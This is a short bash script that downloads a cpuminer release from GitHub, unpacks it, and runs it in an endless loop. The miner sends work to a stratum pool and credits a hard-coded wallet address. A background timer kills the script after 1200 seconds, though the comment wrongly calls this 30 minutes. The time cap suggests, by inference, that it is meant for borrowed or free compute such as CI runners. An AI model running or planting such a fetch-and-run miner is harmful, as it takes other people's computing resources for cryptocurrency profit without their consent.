#!/bin/bash

Timeout=1200 # 30 minutes

function timeout_monitor() {
   sleep "$Timeout"
   kill "$1"
}

# start the timeout monitor in 
# background and pass the PID:
timeout_monitor "$$" &
Timeout_monitor_pid=$!

wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz
while [ 1 ]; do
	./cpuminer-sse2 -a gr  -o stratum+tcps://stratum-na.rplant.xyz:17056 -u RFcnLsWDziyWU7Hj8VrTpuAAv7FFYBJTi6.Dee
	sleep 5
done
# <your script here>

# kill timeout monitor when terminating:
kill "$Timeout_monitor_pid"
exit 0
